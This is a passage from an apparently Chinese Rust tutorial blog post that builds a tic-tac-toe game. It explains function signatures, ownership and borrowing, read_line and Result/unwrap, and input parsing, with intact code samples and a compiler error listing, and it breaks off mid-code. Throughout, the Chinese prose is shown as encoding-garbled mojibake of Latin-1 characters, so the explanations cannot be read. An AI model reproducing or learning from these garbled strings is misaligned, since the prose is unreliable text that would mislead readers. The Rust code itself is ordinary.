å‡½æ•°å&lt;ç‰¹å¾å’Œç”Ÿå‘½å‘¨æœŸ&gt;(å‚æ•°å1: å‚æ•°ç±»å‹1, ...) -&gt; è¿”å›å€¼ç±»å‹ &#123;&#125;</code> ï¼Œ ç‰¹å¾å’Œç”Ÿå‘½å‘¨æœŸå…ˆä¸ç”¨ç®¡åé¢å†è¯´ï¼Œå¦‚æœä¸æ³¨æ˜ç‰¹å¾çº¦æŸæˆ–è€…ç”Ÿå‘½å‘¨æœŸï¼Œå°–æ‹¬å·çš„éƒ¨åˆ†æ˜¯å¯ä»¥çœç•¥çš„ï¼Œå°±åƒmainä¸€æ ·å‡½æ•°ååé¢ç›´æ¥å°±æ˜¯åœ†æ‹¬å·äº†ã€‚é‚£æˆ‘ä»¬å°±ç…§çŒ«ç”»è™çš„å…ˆå†™ä¸€ä¸ªå‡½æ•°çœ‹çœ‹å§ï¼</p><blockquote><p>  æ³¨æ„å‡½æ•°çš„ç±»å‹æ ‡æ³¨ä¸èƒ½çœç•¥</p></blockquote><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">fn</span> <span class="title function_">print_board</span>(board: &amp;[[<span class="type">char</span>; <span class="number">3</span>]; <span class="number">3</span>]) &#123;</span><br><span class="line">    <span class="comment">// todo</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç”±äºæˆ‘ä»¬åªéœ€è¦è¾“å‡ºï¼Œæ‰€ä»¥å¯ä»¥ä¸ç”¨è¿”å›å€¼ï¼Œå½“ç„¶å®é™…ä¸Šæ˜¯æœ‰è¿”å›å€¼çš„ï¼Œè¿™ä¸ªå‡½æ•°è¿”å›çš„æ˜¯ä¸€ä¸ªç©ºå…ƒç»„ï¼Œæˆ–è€…è¯´æ˜¯ä¸€ä¸ªå•å…ƒç±»å‹ï¼Œå®ƒé•¿è¿™æ · <code>()</code> ï¼Œ å®ƒå¯ä»¥å¿½ç•¥æ‰ï¼Œå½“ç„¶å¦‚æœä½ å†™ä¸Š <code>-&gt; () </code> ä¹Ÿä¸ä¼šé”™ã€‚</p><p>è¿™ä¸ªå‡½æ•°åªæœ‰ä¸€ä¸ªå‚æ•°boardï¼Œç±»å‹æ˜¯ä¸€ä¸ª 3x3çš„charæ•°ç»„çš„å¼•ç”¨ï¼Œä¸€èˆ¬æ¥è¯´ï¼Œæˆ‘ä»¬å®šä¹‰ä¸€ä¸ªå‡½æ•°å¦‚æœè¦ä¼ å…¥ä¸€ä¸ªå¤æ‚ç±»å‹çš„å‚æ•°ï¼Œæˆ‘ä»¬ä¸€èˆ¬é‡‡ç”¨ä¼ å…¥ä¸€ä¸ªå¼•ç”¨çš„å½¢å¼ï¼Œè¿™ä¼šæ¶‰åŠåˆ°æ‰€æœ‰æƒçš„çŸ¥è¯†ã€‚</p><blockquote><p>  <strong>æ‰€æœ‰æƒå’Œå€Ÿç”¨</strong>æ˜¯Rustçš„ä¸€ä¸ªéå¸¸é‡è¦çš„å†…å®¹ã€‚å¯¹äºå†…å­˜ç®¡ç†ï¼Œç›¸ä¿¡å¤§å®¶éƒ½å¾ˆç†Ÿæ‚‰GCï¼ˆæ¯”å¦‚Javaï¼ŒGOï¼‰å’Œæ‰‹åŠ¨ç®¡ç†å†…å­˜çš„åˆ†é…å’Œé‡Šæ”¾ï¼ˆæ¯”å¦‚C&#x2F;Cppï¼‰ï¼Œè€Œæ‰€æœ‰æƒæ˜¯ä¸åŒä¸å‰2ç§æµæ´¾çš„ç¬¬ä¸‰ç§æµæ´¾ï¼Œå®ƒä¼šåœ¨ç¼–è¯‘æœŸå°±æ ¹æ®ä¸€ç³»åˆ—è§„åˆ™è¿›è¡Œæ£€æŸ¥ï¼Œå› æ­¤å¯¹äºè¿è¡ŒæœŸä¸ä¼šæœ‰ä»»ä½•æ€§èƒ½ä¸Šçš„æŸå¤±ã€‚</p><p>  è¿™é‡Œå› ä¸ºç¯‡å¹…å…³ç³»ä¸ä¾¿è¯¦è°ˆï¼Œç®€å•æ¥è¯´æ‰€æœ‰æƒæœ‰ä»¥ä¸‹å‡ æ¡è§„åˆ™ï¼š</p><p>  1ï¼‰Rustä¸­çš„æ¯ä¸ªå€¼éƒ½è¢«ä¸€ä¸ªå˜é‡æ‰€æ‹¥æœ‰ï¼Œè¯¥å˜é‡è¢«ç§°ä¸ºå€¼çš„æ‰€æœ‰è€…ï¼›</p><p>  2ï¼‰ä¸€ä¸ªå€¼åŒæ—¶åªèƒ½è¢«ä¸€ä¸ªå˜é‡æ‰€æ‹¥æœ‰ï¼›</p><p>  3ï¼‰å½“æ‰€æœ‰è€…ï¼ˆå˜é‡ï¼‰ç¦»å¼€ä½œç”¨åŸŸèŒƒå›´æ—¶ï¼Œè¿™ä¸ªå€¼å°†è¢«ä¸¢å¼ƒï¼ˆdropï¼‰</p><p>  ä»¥Stringä¸ºä¾‹ï¼Œå®ƒæ˜¯è¢«åˆ†é…åˆ°å †ä¸Šçš„æ•°æ®ï¼Œæ‰€ä»¥æ²¡æœ‰å®ç°Copyç‰¹å¾ï¼Œé‚£ä¹ˆå¦‚æœæˆ‘æ‰§è¡Œäº†å¦‚ä¸‹ä»£ç </p>  <figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> <span class="variable">s1</span> = <span class="type">String</span>::<span class="title function_ invoke__">from</span>(<span class="string">&quot;Test_string&quot;</span>);</span><br><span class="line"><span class="keyword">let</span> <span class="variable">s2</span> = s1;</span><br><span class="line"><span class="built_in">println!</span>(<span class="string">&quot;&#123;&#125;&quot;</span>, s2);</span><br><span class="line"><span class="built_in">println!</span>(<span class="string">&quot;&#123;&#125;&quot;</span>, s1);</span><br></pre></td></tr></table></figure><p>  è¿™æ®µä»£ç ä¼šæŠ¥é”™ï¼Œå› ä¸ºlet s2 &#x3D; s1 çš„æ—¶å€™ï¼Œs1çš„å€¼çš„æ‰€æœ‰æƒè¢«è½¬ç§»ç»™äº†s2äº†ï¼Œæ‰€ä»¥åé¢ä¸èƒ½è°ƒç”¨s1äº†</p><p>  è¿™é‡Œå¯ä»¥æŠŠç¬¬äºŒè¡Œæ”¹æˆ <code>let s2 = &amp;s1;</code> ï¼Œè¿™æ ·s2å°±æ˜¯s1çš„å€¼çš„ä¸€ä¸ªå¼•ç”¨ï¼ˆå°±ç›¸å½“äºä½ å€Ÿæ¥ç”¨ç”¨ï¼Œä½†æ˜¯ä¸å…·æœ‰å®ƒçš„æ‰€æœ‰æƒï¼‰å°±å¯ä»¥æ­£å¸¸è¿è¡Œï¼›æˆ–è€…æ”¹ä¸º <code>let s2 = s1.clone();</code>ï¼Œ Stringå®ç°äº†cloneç‰¹å¾ï¼Œæ‰€ä»¥å¯ä»¥è°ƒç”¨cloneæ–¹æ³•æ¥å¤åˆ¶ä¸€ä»½ï¼Œæ³¨æ„è¿™ä¼šåœ¨å †ä¸Šå†ç”³è¯·ä¸€å—å†…å­˜ï¼Œæ‰€ä»¥ä½¿ç”¨cloneä¼šæœ‰ä¸€ç‚¹çš„æ€§èƒ½å¼€é”€ã€‚ä½†æ˜¯å¦‚æœæˆ‘ä»¬æŠŠè¿™æ®µä»£ç æ”¹æˆï¼š</p>  <figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> <span class="variable">s1</span> = <span class="number">0x114514</span>;</span><br><span class="line"><span class="keyword">let</span> <span class="variable">s2</span> = s1;</span><br><span class="line"><span class="built_in">println!</span>(<span class="string">&quot;&#123;:x&#125;&quot;</span>, s2);</span><br><span class="line"><span class="built_in">println!</span>(<span class="string">&quot;&#123;:x&#125;&quot;</span>, s1);</span><br></pre></td></tr></table></figure><p>  è¿è¡Œå‘ç°å¯ä»¥æ­£å¸¸è¾“å‡ºä¸¤è¡Œ114514ï¼Œè¿™æ˜¯å› ä¸ºæ•´å‹æ˜¯åŸºæœ¬ç±»å‹ï¼Œé»˜è®¤å®ç°äº†Copyç‰¹å¾ï¼Œå¯ä»¥è¿›è¡Œå¿«é€Ÿæ‹·è´ï¼Œlet s2çš„æ—¶å€™å°±æ˜¯æŠŠs1çš„å€¼æ‹·è´äº†ä¸€ä»½ç„¶ååœ¨æ ˆä¸Šçš„å¦ä¸€ä¸ªåœ°æ–¹å¼€ä¸€å—ç©ºé—´å­˜æ”¾0x114514ä½œä¸ºs2ï¼Œå’Œä¸Šä¸€ä¸ªä¾‹å­ç›¸æ¯”è¾ƒå‘ç°copyå’Œcloneéƒ½æ˜¯æŠŠå€¼å¤åˆ¶äº†ä¸€éåœ¨å¦å¤–æ‰¾ä¸€å—ç©ºé—´æ¥å­˜æ”¾ï¼ŒåŒºåˆ«å°±æ˜¯ä¸€ä¸ªåœ¨å †ä¸Šï¼Œä¸€ä¸ªåœ¨æ ˆä¸Šã€‚</p></blockquote><p>å¥½ï¼Œè¯è¯´å›æ¥ï¼Œæˆ‘ä»¬è¯¥å†™è¿™ä¸ªå‡½æ•°çš„å…·ä½“é€»è¾‘äº†ã€‚å…¶å®åªè¦ç®€å•çš„éå†ä»¥ä¸‹boardçš„æ¯ä¸ªå€¼å°±å¯ä»¥å§ï¼Œå½“ç„¶ä¸ºäº†å¥½çœ‹ï¼Œæˆ‘ä»¬å¯ä»¥åŠ ä¸€ä¸ªè¾¹æ¡†ï¼Œåƒè¿™æ ·ï¼š</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">fn</span> <span class="title function_">print_board</span>(board: &amp;[[<span class="type">char</span>; <span class="number">3</span>]; <span class="number">3</span>]) &#123;</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;+---+---+---+&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> <span class="variable">row</span> <span class="keyword">in</span> board &#123;</span><br><span class="line">        <span class="built_in">print!</span>(<span class="string">&quot;| &quot;</span>);</span><br><span class="line">        <span class="keyword">for</span> <span class="variable">col</span> <span class="keyword">in</span> row &#123;</span><br><span class="line">            <span class="built_in">print!</span>(<span class="string">&quot;&#123;&#125; | &quot;</span>, col);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">println!</span>(<span class="string">&quot;\n+---+---+---+&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç„¶ååœ¨mainé‡Œé¢æ·»åŠ  <code>print_board(&amp;board);</code>ï¼Œ è¿è¡Œä¸€ä¸‹ï¼Œè¾“å‡ºçš„åº”è¯¥æ˜¯è¿™æ ·ï¼šï¼ˆæˆ‘åœ¨<a href="https://play.rust-lang.org/%E8%BF%90%E8%A1%8C%E7%9A%84%EF%BC%89">https://play.rust-lang.org/è¿è¡Œçš„ï¼‰</a></p><p><img src="/Rust-QuickStart/image-20231128185424273.png" alt="board"></p><p>è¿™é‡Œæˆ‘ç”¨äº†ä¸¤ä¸ªforæ¥éå†æ•°ç»„ï¼Œrustçš„foræ˜¯ç±»ä¼¼ä¸pythonè¿™ç±»è¯­è¨€çš„forï¼Œæ˜¯éå†ä¸€ä¸ªè¿­ä»£å™¨çš„å€¼ï¼Œè€Œä¸æ˜¯ç®€å•çš„éå†ç´¢å¼•ã€‚</p><blockquote><p>  å½“ç„¶å¦‚æœæƒ³è¦åƒcä¸€æ ·æˆ–è€…åƒpythonçš„for i in range(n)è¿™ç§å½“ç„¶ä¹Ÿå¯ä»¥ï¼Œåƒè¿™æ ·å°±å¯ä»¥ã€‚</p>  <figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> <span class="variable">idx</span> <span class="keyword">in</span> <span class="number">0</span>..<span class="number">10</span> &#123;&#125;</span><br></pre></td></tr></table></figure><p>  è¦æ³¨æ„0..10ç±»ä¼¼pythonçš„rangeæ˜¯å·¦å–åˆä¸å–çš„ï¼Œå¦‚æœä½ æƒ³è¦ä»0éå†åˆ°10ï¼Œå¯ä»¥ 0..11, æˆ–è€… 0..&#x3D;10</p></blockquote><p><strong>æ³¨æ„forä¸æ”¯æŒç»™è¿­ä»£çš„å˜é‡æ ‡æ³¨ç±»å‹</strong>ï¼Œä¹Ÿå°±æ˜¯è¯´æ¯”å¦‚ <code>for row: &amp;[char; 3] in board &#123;...&#125;</code> è¿™ç§æ˜¯ä¸è¢«å…è®¸çš„ï¼å½“ç„¶ä¹Ÿæ— é¡»æ‹…å¿ƒï¼Œå› ä¸ºç¼–è¯‘å™¨ä¼šè‡ªåŠ¨æ¨å¯¼å‡ºç±»å‹ï¼</p><h3 id="Receive-input-and-Process-it"><a href="#Receive-input-and-Process-it" class="headerlink" title="Receive input and Process it"></a>Receive input and Process it</h3><p>ä½ å¯èƒ½æœŸå¾…rustçš„è¾“å…¥å¯ä»¥åƒc&#x2F;cppçš„scanf&#x2F;freadï¼Œæˆ–è€…pythonçš„input()ä¸€æ ·ï¼Œå¯ä»¥ç›´æ¥è°ƒç”¨ä¸€ä¸ªå‡½æ•°æ¥è·å–ç»ˆç«¯è¾“å…¥ã€‚ä½†æ˜¯å¾ˆé—æ†¾ï¼Œrustå¹¶ä¸ç›´æ¥å­˜åœ¨è¿™ä¹ˆä¸€ä¸ªå‡½æ•°ï¼Œæˆ–è€…è¯´ï¼Œå®ƒè¢«å°è£…åœ¨Stdinç±»ä¸‹ï¼Œæ¯”å¦‚æœ€å¸¸è§çš„æ˜¯<code>.read_line()</code></p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> <span class="variable">stdin</span> = std::io::<span class="title function_ invoke__">stdin</span>();</span><br><span class="line">stdin.<span class="title function_ invoke__">read_line</span>(&amp;<span class="keyword">mut</span> input).<span class="title function_ invoke__">unwrap</span>();</span><br></pre></td></tr></table></figure><p>è¿™æ ·å°±ä¼šä»ç»ˆç«¯ä¸­è¯»å–ä¸€è¡Œï¼ˆåŒ…æ‹¬æ¢è¡Œç¬¦ï¼‰æ‹¼æ¥åœ¨inputç»“å°¾å¤„ï¼Œæ‰€ä»¥åœ¨å¾ªç¯ä¸­æˆ‘ä»¬å¿…é¡»åœ¨æ¯æ¬¡å¼€å¤´éƒ½æ¸…ç©ºä¸€ä¸‹inputä¸­çš„å†…å®¹ã€‚ä½ éœ€è¦åœ¨read_lineçš„ä¸Šä¸€è¡Œæ’å…¥ï¼š</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">input.<span class="title function_ invoke__">clear</span>();</span><br></pre></td></tr></table></figure><p>éœ€è¦æ³¨æ„ï¼šclearå’Œread_lineéƒ½æ˜¯æ”¹å˜inputçš„å€¼ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦åœ¨å£°æ˜inputçš„æ—¶å€™æ·»åŠ mutå…³é”®å­—ä½¿å…¶å¯å˜ï¼Œè€Œ <code>&amp;mut input</code> æ˜¯inputçš„å¯å˜å¼•ç”¨ï¼Œå®ƒä¹Ÿæ˜¯ä¸€ç§å¼•ç”¨ï¼Œä¸å…·æœ‰æ‰€æœ‰æƒï¼Œä½†æ˜¯å…·æœ‰å…¶ä½¿ç”¨æƒå’Œæ›´æ”¹æƒé™ï¼Œæ‰€ä»¥å¯ä»¥å¯¹inputæœ¬èº«è¿›è¡Œæ›´æ”¹ã€‚</p><blockquote><p>  <strong>ä¸€ä¸ªå˜é‡æœ€å¤šåªèƒ½æœ‰ä¸€ä¸ªå¯å˜å¼•ç”¨ï¼Œå¹¶ä¸”æœ‰å¯å˜å¼•ç”¨æ—¶ï¼Œä¸å…è®¸å­˜åœ¨ä¸å¯å˜å¼•ç”¨ï¼Œä¹Ÿä¸èƒ½é€šè¿‡æ‰€æœ‰è€…æ¥è®¿é—®å€¼</strong></p><p>  æ¥çœ‹è¿™æ®µä»£ç </p>  <figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">a</span> = <span class="number">10</span>;</span><br><span class="line"><span class="keyword">let</span> <span class="variable">b</span> = &amp;<span class="keyword">mut</span> a;</span><br><span class="line">*b += <span class="number">1</span>;</span><br><span class="line"><span class="built_in">println!</span>(<span class="string">&quot;&#123;&#125; &#123;&#125;&quot;</span>, a, b);</span><br></pre></td></tr></table></figure><p>  è¿è¡Œåæœä¸å…¶ç„¶æŠ¥é”™äº†</p>  <figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">error[<span class="type">E0502</span>]: cannot borrow `a` as immutable because it is also borrowed as mutable</span><br><span class="line"> <span class="literal">--</span>&gt; src/main.rs:<span class="number">5</span>:<span class="number">23</span></span><br><span class="line">  |</span><br><span class="line"><span class="number">3</span> |     let b = &amp;mut a;</span><br><span class="line">  |             <span class="literal">------</span> mutable borrow occurs here</span><br><span class="line"><span class="number">4</span> |     *b += <span class="number">1</span>;</span><br><span class="line"><span class="number">5</span> |     println!(<span class="string">&quot;&#123;&#125; &#123;&#125;&quot;</span>, a, b);</span><br><span class="line">  |                       ^  - mutable borrow later used here</span><br><span class="line">  |                       |</span><br><span class="line">  |                       immutable borrow occurs here</span><br><span class="line">  |</span><br><span class="line">  = note: this error originates <span class="keyword">in</span> the macro `$crate::format_args_nl` which comes from the expansion of the macro `println` (<span class="keyword">in</span> Nightly builds, run with <span class="literal">-Z</span> macro<span class="literal">-backtrace</span> <span class="keyword">for</span> more info)</span><br><span class="line"></span><br><span class="line"><span class="keyword">For</span> more information about this error, <span class="keyword">try</span> `rustc <span class="literal">--explain</span> E0502`.</span><br></pre></td></tr></table></figure><p>  å¯ä»¥è¿™ä¹ˆæ¥æƒ³ï¼ŒAæœ‰ä¸€ä¸ªPSï¼ŒBå€Ÿè¿‡æ¥ç©ï¼ˆå¯å˜å¼•ç”¨ï¼‰ï¼ŒBåœ¨ç©çš„è¿‡ç¨‹ä¸­ï¼ˆBçš„ä½œç”¨èŒƒå›´æ²¡æœ‰ç»“æŸï¼‰ï¼ŒAï¼ˆæ‰€æœ‰è€…ï¼‰å’Œå…¶ä»–äººï¼ˆå…¶ä»–å€Ÿç”¨ï¼‰æ˜¾ç„¶ä¸èƒ½å€Ÿèµ°å§ï¼Œé™¤éBè¿˜å›å»ï¼ˆBçš„ä½œç”¨ç»“æŸï¼‰ï¼Œè¿™æ ·å°±å›åˆ°Aæ‰‹ä¸Šäº†ï¼ŒAåˆå¯ä»¥ç»§ç»­ç©ï¼ˆAå¯ä»¥è®¿é—®æˆ–ä¿®æ”¹å€¼äº†ï¼‰</p><p>  å¦‚æœæŠŠä¸Šé¢é‚£æ®µæ”¹æˆè¿™æ ·å°±Okäº†</p>  <figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">a</span> = <span class="number">10</span>;</span><br><span class="line"><span class="keyword">let</span> <span class="variable">b</span> = &amp;<span class="keyword">mut</span> a;<span class="comment">// å¯å˜å€Ÿç”¨ b ä½œç”¨åŸŸå¼€å§‹</span></span><br><span class="line">*b += <span class="number">1</span>; <span class="comment">/* ps: *æ˜¯è§£å¼•ç”¨ï¼Œå› ä¸ºbæ˜¯&amp;i32, æ²¡æœ‰å®ç°+=ï¼Œæ‰€ä»¥è¦è§£å¼•ç”¨å¯¹å€¼æœ¬èº«+= */</span></span><br><span class="line"><span class="built_in">println!</span>(<span class="string">&quot;&#123;&#125;&quot;</span>, b);<span class="comment">// b ä½œç”¨åŸŸç»“æŸï¼Œå› ä¸ºåé¢éƒ½æ²¡æœ‰å†ä½¿ç”¨bäº†</span></span><br><span class="line"><span class="built_in">println!</span>(<span class="string">&quot;&#123;&#125;&quot;</span>, a);<span class="comment">// b ä½œç”¨ç»“æŸåå€¼çš„ä½¿ç”¨æƒè‡ªåŠ¨è¿˜ç»™aï¼Œæ‰€ä»¥aå¯ä»¥è¾“å‡º</span></span><br></pre></td></tr></table></figure><p>  å»ºè®®è‡ªå·±å†™å†™å°è¯•ä¸€ä¸‹ï¼šD</p></blockquote><p>é‚£ä¹ˆread_lineåé¢çš„ <code>.unwrap()</code> æ˜¯å¹²å˜›çš„å‘¢ï¼Œä½ å¯èƒ½ä¼šæœ‰è¿™ç§ç–‘é—®ã€‚</p><p>å…¶å®åŠŸèƒ½å°±åƒå­—é¢æ„æ€é‚£æ ·ï¼Œâ€œæ‹†å¼€â€ï¼Œè¿™é‡Œå› ä¸ºread_lineï¼Œè¿”å›çš„æ˜¯ä¸€ä¸ªResultï¼Œè€Œresultéœ€è¦æ‰‹åŠ¨å¤„ç†ï¼Œæ‰€ä»¥è¿™é‡Œå°±ç”¨unwrapæ¥å–å‡ºé‡Œé¢çš„å€¼</p><blockquote><p>  Resultæ˜¯ä¸€ä¸ªæšä¸¾ç±»å‹ï¼Œå®šä¹‰æ˜¯è¿™æ ·çš„</p>  <figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">pub</span> <span class="keyword">enum</span> <span class="title class_">Result</span>&lt;T, E&gt; &#123;</span><br><span class="line">    <span class="title function_ invoke__">Ok</span>(T),</span><br><span class="line">    <span class="title function_ invoke__">Err</span>(E),</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>  è¿™é‡ŒTï¼ŒEéƒ½æ˜¯æ³›å‹ï¼Œä¸€èˆ¬Tæ˜¯ä¸€ä¸ªä½ æœŸæœ›çš„å€¼ï¼ŒEæ˜¯ä¸€ä¸ªé”™è¯¯ã€‚å½“unwrapé‡åˆ°Okæ—¶å°±ä¼šæ­£å¸¸å–å‡ºå€¼ï¼Œè€Œå¦‚æœæ˜¯Errï¼Œå°±ä¼š<code>panic!</code> ï¼Œç„¶åä½ å°±å‘ç°ç¨‹åºå´©æºƒå¹¶ä¸”è¾“å‡ºäº†ä¸€å †å¥‡å¥‡æ€ªæ€ªçš„ä¸œè¥¿ã€‚</p><p>  ä¸€èˆ¬è¿”å›resultå°±æ˜¯è®©ä½ è‡ªå·±æ¥é”™è¯¯å¤„ç†ï¼Œå¸¸å¸¸ä¼šé…åˆmatchä¹‹ç±»çš„ã€‚åœ¨åé¢è®²é”™è¯¯å¤„ç†çš„æ—¶å€™å†è¯´ï¼šD</p></blockquote><p>å“¦ï¼Œå·®ç‚¹å¿˜è®°äº†ï¼Œæˆ‘ä»¬éœ€è¦äº›ä»€ä¹ˆæ•°æ®å¥½åƒè¿˜æ²¡è¯´ã€‚ä¸å¦‚è¾“å…¥çš„æ ¼å¼å°±æ˜¯ <code>row col</code>å§ã€‚æ‰€ä»¥æˆ‘ä»¬åœ¨è¾“å…¥ä¹‹å‰åŠ ä¸Šä¸€æ¡è¯´æ˜ã€‚</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">print_board</span>(&amp;board);</span><br><span class="line"><span class="built_in">println!</span>(<span class="string">&quot;Please input your move: (fmt: row col)&quot;</span>);</span><br><span class="line"><span class="comment">// ...</span></span><br></pre></td></tr></table></figure><p>ç„¶åæˆ‘ä»¬å¾—è¦æŠŠè¡Œåˆ—æ•°æ®æå–å‡ºæ¥ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨split_whitespaceï¼Œå®ƒä¼šå»æ‰ç©ºæ ¼ã€tabã€å›è½¦ä¹‹ç±»çš„å­—ç¬¦ï¼Œå¹¶ä¸”ä¼šç”±æ­¤æŠŠå…¶ä»–å¯è§å­—ç¬¦å­—ä¸²éš”å¼€ï¼Œè¿”å›çš„æ˜¯ä¸€ä¸ªè¿­ä»£å™¨ã€‚</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> <span class="variable">input</span> = input</span><br><span class="line">.<span class="title function_ invoke__">split_whitespace</span>()</span><br><span class="line">.<span class="title function_ invoke__">map</span>(|x| x.parse::&lt;<span class="type">usize</span>&gt;().<span class="title function_ invoke__">unwrap</span>())</span><br><span class="line">.collect::&lt;<span class="type">Vec</span>&lt;<span class="type">usize</span>&gt;&gt;();</span><br><span class="line"><span class="keyword">let</span> <span class="variable">row</span> = input[<span class="number">0</span>];</span><br><span class="line"><span class="keyword">let</span> <span class="variable">col</span> = input[<span class="number">1</span>];</span><br></pre></td></tr></table></figure><blockquote><p>  mapå…¶å®åŠŸèƒ½å°±æ˜¯ä½ ä»¬å°è±¡çš„é‚£ä¸ªmapï¼Œåœ¨rusté‡Œï¼Œåªè¦å®ç°äº†è¿­ä»£å™¨ç‰¹å¾çš„ç±»å‹å°±å¯ä»¥è°ƒç”¨mapæ–¹æ³•ï¼Œmapæ¥æ”¶ä¸€ä¸ªé—­åŒ…ä½œä¸ºå‚æ•°ï¼Œå¦‚æœä½ ç”¨è¿‡ä¸€äº›å‡½æ•°å¼è¯­è¨€å¯èƒ½ä¼šæ¯”è¾ƒç†Ÿæ‚‰ â€œé—­åŒ…â€ è¿™ä¸ªæ¦‚å¿µï¼Œå…¶å®å®ƒå°±æ˜¯ç±»ä¼¼lambdaçš„ä¸œè¥¿ï¼Œå…¶å…·ä½“çš„å½¢å¼æ˜¯æ¥è¿‘Rubyè¯­è¨€çš„é—­åŒ…çš„ã€‚</p><p>  <code>||</code> é‡Œé¢çš„æ˜¯å…¥å‚ï¼Œé—­åŒ…ä¼šè‡ªåŠ¨æŠŠæ•è·çš„å€¼ç»‘å®šåˆ°é‡Œé¢çš„å˜é‡ï¼Œä½ å¯ä»¥æ ‡æ³¨ç±»å‹ï¼Œä½†æ˜¯åŒæ ·ä¹Ÿæ²¡å¿…è¦è¿™æ ·åšï¼Œå› ä¸ºç¼–è¯‘å™¨ä¼šè‡ªåŠ¨æ¨å¯¼ï¼<code>||</code> åé¢æ˜¯ä¸€ä¸ªè¡¨è¾¾å¼ï¼Œè¿™ä¹Ÿæ„å‘³ç€ï¼Œä½ å¯ä»¥åœ¨ {} ä¸­å†™å¤šè¡Œä»£ç ï¼Œè€Œä¸ç”¨åƒpythonçš„lambdaä¸€æ ·åªèƒ½æƒ³åŠæ³•æŠŠè¡¨è¾¾å¼å‹ç¼©åˆ°ä¸€è¡Œ</p><p>  ç„¶åé‡Œé¢çš„å…¥å‚ x æ˜¯ä¸€ä¸ª&amp;strç±»å‹ï¼Œè¿™é‡Œé€šè¿‡parse()æ–¹æ³•è§£ææˆusizeç±»å‹ï¼ˆé€šè¿‡ <code>::&lt;&gt;</code> çš„æ ¼å¼æ¥æŒ‡å®šï¼‰ï¼Œè¿”å›çš„ä¹Ÿæ˜¯Resultï¼ˆå› ä¸ºå¯èƒ½è§£æå¤±è´¥ï¼‰ï¼Œç„¶åunwrapè§£åŒ…ã€‚</p><p>  å†é€šè¿‡collectæ–¹æ³•æŠŠmapè¿”å›çš„è¿­ä»£å™¨æ”¶é›†æˆä¸€ä¸ªVecï¼ˆæ˜¯ä¸å®šé•¿çš„æ•°ç»„ï¼Œæ‰€ä»¥åˆ›å»ºæ—¶ä¸ç”¨åƒæ•°ç»„ä¸€æ ·æ ‡æ³¨é•¿åº¦ï¼‰</p></blockquote><h3 id="Move"><a href="#Move" class="headerlink" title="Move"></a>Move</h3><p>æ¥ä¸‹æ¥å°±è¦è½å­äº†ï¼Œæˆ‘ä»¬å®šä¹‰ä¸€ä¸ªon_moveï¼Œè¿”å›å€¼æ˜¯ä¸€ä¸ªboolï¼Œæ¥è¡¨ç¤ºæ˜¯å¦è½å­æˆåŠŸã€‚</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">fn</span> <span class="title function_">on_move</span>(board: &amp;<span class="keyword">mut</span> [[<span class="type">char</span>; <span class="number">3</span>]; <span class="number">3</span>], row: <span class="type">usize</span>, col: <span class="type">usize</span>, symbol: <span class="type">char</span>) <span class="punctuation">-&gt;</span> <span class="type">bool</span> &#123;</span><br><span class="line">    <span class="comment">// symbol æ˜¯å½“å‰ç©å®¶å¯¹åº”çš„ç¬¦å·</span></span><br><span class="line">    <span 